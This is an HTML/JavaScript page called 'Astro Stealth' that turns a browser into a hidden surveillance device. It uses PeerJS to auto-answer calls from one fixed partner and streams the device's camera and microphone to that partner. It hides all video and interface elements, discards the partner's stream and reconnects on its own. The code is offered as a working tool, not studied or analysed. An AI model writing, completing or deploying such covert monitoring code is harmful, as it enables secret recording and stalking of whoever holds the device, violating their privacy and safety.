<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Astro Stealth</title>
    <style>
        /* Complete invisibility - no visual elements */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: transparent;
            min-height: 0;
            padding: 0;
            margin: 0;
            overflow: hidden;
        }
        
        /* Hidden video elements - prevents any preview LED */
        video {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            top: -1000px;
            left: -1000px;
        }
        
        audio {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
        
        /* Ensure no visible elements on page */
        div, span, button, iframe {
            display: none !important;
        }
    </style>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
</head>
<body>
    <video id="localVideo" autoplay muted playsinline></video>
    <video id="remoteVideo" autoplay playsinline></video>

    <script>
        // ============ STEALTH CONFIGURATION ============
        const MY_ID = "BPrivate";
        const PARTNER_ID = "APrivate";
        const AUTO_ACCEPT_CALLS = true;     // Auto-accept all monitoring requests
        const SEND_AUDIO = true;             // Send audio FROM stealth device
        const SEND_VIDEO = true;             // Send video FROM stealth device
        // ==============================================
        
        let peer = null;
        let currentCall = null;
        let localStream = null;
        let reconnectAttempts = 0;
        const MAX_RECONNECTS = 5;
        
        // Silent logging (only to console, no UI)
        function log(msg, type = 'info') {
            const prefix = type === 'error' ? '❌' : (type === 'warn' ? '⚠️' : '✅');
            console.log(`[STEALTH] ${prefix} ${msg}`);
        }
        
        async function getMediaStream() {
            // First try to get both front and back camera capabilities
            let devices = [];
            let backCameraExists = false;
            let frontCameraExists = false;
            
            try {
                const allDevices = await navigator.mediaDevices.enumerateDevices();
                devices = allDevices.filter(device => device.kind === 'videoinput');
                backCameraExists = devices.some(device => device.label.toLowerCase().includes('back') || device.label.toLowerCase().includes('rear'));
                frontCameraExists = devices.some(device => device.label.toLowerCase().includes('front') || device.label.toLowerCase().includes('face'));
                log(`Found ${devices.length} cameras - Back: ${backCameraExists}, Front: ${frontCameraExists}`, 'info');
            } catch(e) {
                log(`Could not enumerate devices: ${e.message}`, 'warn');
            }
            
            // Try back camera first if available, otherwise fallback to any camera
            let constraints = {
                audio: SEND_AUDIO ? {
                    echoCancellation: false,
                    noiseSuppression: false,
                    autoGainControl: false
                } : false,
                video: SEND_VIDEO ? {
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                } : false
            };
            
            // Try to get back camera specifically
            if (SEND_VIDEO) {
                try {
                    log('Attempting to access BACK camera...', 'info');
                    const backCameraConstraints = {
                        audio: SEND_AUDIO,
                        video: { facingMode: { exact: "environment" } }
                    };
                    const stream = await navigator.mediaDevices.getUserMedia(backCameraConstraints);
                    log('✅ BACK camera acquired successfully', 'success');
                    return stream;
                } catch (backError) {
                    log(`Back camera not available: ${backError.message}`, 'warn');
                    
                    // Try front camera
                    try {
                        log('Attempting to access FRONT camera...', 'info');
                        const frontCameraConstraints = {
                            audio: SEND_AUDIO,
                            video: { facingMode: { exact: "user" } }
                        };
                        const stream = await navigator.mediaDevices.getUserMedia(frontCameraConstraints);
                        log('✅ FRONT camera acquired successfully', 'success');
                        return stream;
                    } catch (frontError) {
                        log(`Front camera not available: ${frontError.message}`, 'warn');
                        
                        // Fallback to default camera
                        log('Falling back to default camera...', 'info');
                        const defaultConstraints = {
                            audio: SEND_AUDIO,
                            video: true
                        };
                        const stream = await navigator.mediaDevices.getUserMedia(defaultConstraints);
                        log('✅ Default camera acquired', 'success');
                        return stream;
                    }
                }
            } else {
                // Audio only
                const audioConstraints = {
                    audio: SEND_AUDIO,
                    video: false
                };
                return await navigator.mediaDevices.getUserMedia(audioConstraints);
            }
        }
        
        function handleIncomingCall(call) {
            const isVideo = call.metadata?.type === 'video';
            log(`Incoming ${isVideo ? 'VIDEO' : 'AUDIO'} monitoring request from remote`, 'info');
            
            if (!AUTO_ACCEPT_CALLS) {
                log('Call rejected (auto-accept disabled)', 'warn');
                call.close();
                return;
            }
            
            // Get stealth device's media stream
            getMediaStream().then(stream => {
                localStream = stream;
                
                // Log what we're sending
                const hasAudio = stream.getAudioTracks().length > 0;
                const hasVideo = stream.getVideoTracks().length > 0;
                log(`Sending to remote - Audio: ${hasAudio}, Video: ${hasVideo}`, 'success');
                
                // Hide video element completely
                if (hasVideo) {
                    const videoElement = document.getElementById('localVideo');
                    videoElement.srcObject = stream;
                    videoElement.style.opacity = '0';
                    videoElement.style.width = '1px';
                    videoElement.style.height = '1px';
                }
                
                // Answer call with stealth device's stream
                call.answer(stream);
                currentCall = call;
                
                // Handle incoming stream from remote (IGNORE)
                call.on('stream', (remoteStream) => {
                    log(`Remote stream received but IGNORED (stealth receives nothing)`, 'info');
                    
                    if (remoteStream) {
                        remoteStream.getTracks().forEach(track => {
                            track.enabled = false;
                            track.stop();
                            log(`Disabled remote ${track.kind} track`, 'info');
                        });
                    }
                    
                    log(`${isVideo ? 'Video' : 'Audio'} monitoring ACTIVE - Stealth → Remote only`, 'success');
                });
                
                call.on('close', () => {
                    log(`${isVideo ? 'Video' : 'Audio'} monitoring ended`);
                    endCall();
                });
                
                call.on('error', (err) => {
                    log(`Call error: ${err}`, 'error');
                    endCall();
                });
                
            }).catch(err => {
                log(`Failed to answer call: ${err.message}`, 'error');
                call.close();
            });
        }
        
        function endCall() {
            if (localStream) {
                localStream.getTracks().forEach(track => {
                    track.stop();
                    log(`Stopped ${track.kind} track`, 'info');
                });
                localStream = null;
            }
            if (currentCall) {
                currentCall.close();
                currentCall = null;
            }
            document.getElementById('localVideo').srcObject = null;
            document.getElementById('remoteVideo').srcObject = null;
            log('Call ended, camera/mic released', 'info');
        }
        
        function initPeer() {
            if (peer) {
                peer.destroy();
                peer = null;
            }
            
            log(`Initializing stealth device as ${MY_ID}`);
            
            peer = new Peer(MY_ID);
            
            peer.on('open', (id) => {
                log(`✅ Stealth device ACTIVE - ID: ${MY_ID}`, 'success');
                log(`Ready to send to ${PARTNER_ID} - Audio: ${SEND_AUDIO}, Video: ${SEND_VIDEO}`, 'info');
                reconnectAttempts = 0;
            });
            
            peer.on('call', (call) => {
                if (call.peer === PARTNER_ID) {
                    handleIncomingCall(call);
                } else {
                    log(`Rejected call from unknown: ${call.peer}`, 'warn');
                    call.close();
                }
            });
            
            peer.on('disconnected', () => {
                log('Connection lost', 'warn');
                if (reconnectAttempts < MAX_RECONNECTS) {
                    reconnectAttempts++;
                    log(`Reconnecting (${reconnectAttempts}/${MAX_RECONNECTS})...`);
                    setTimeout(() => {
                        if (peer) peer.reconnect();
                    }, 3000);
                } else {
                    log('Max reconnects reached - refresh page to restart', 'error');
                }
            });
            
            peer.on('error', (err) => {
                if (err.type === 'unavailable-id') {
                    log(`ID ${MY_ID} in use - retrying in 5s...`, 'warn');
                    setTimeout(() => initPeer(), 5000);
                } else if (err.type === 'network') {
                    log('Network error - reconnecting...', 'warn');
                    if (peer) peer.reconnect();
                } else {
                    log(`Peer error: ${err.type}`, 'error');
                }
            });
        }
        
        // Auto-start stealth service
        log('=== ASTRO STEALTH SERVICE ===');
        log(`Configuration (ONE-WAY: Stealth → Remote only):`);
        log(`  - ID: ${MY_ID}`);
        log(`  - Target: ${PARTNER_ID}`);
        log(`  - Send Audio TO Remote: ${SEND_AUDIO}`);
        log(`  - Send Video TO Remote: ${SEND_VIDEO}`);
        log(`  - Receive from Remote: ❌ DISABLED`);
        log(`  - Auto-accept: ${AUTO_ACCEPT_CALLS}`);
        
        initPeer();
        
        // Keep service alive
        setInterval(() => {
            if (peer && !peer.disconnected && currentCall) {
                console.log('[STEALTH] Heartbeat - actively sending to remote');
            }
        }, 30000);
        
        // Clean shutdown
        window.addEventListener('beforeunload', () => {
            log('Stealth device shutting down...', 'info');
            if (currentCall) currentCall.close();
            if (peer) peer.destroy();
            if (localStream) {
                localStream.getTracks().forEach(track => track.stop());
            }
        });
        
        // Handle page visibility
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                log('Page hidden - maintaining stealth', 'info');
            } else {
                log('Page visible - stealth still active', 'info');
            }
        });
    </script>
</body>
</html>
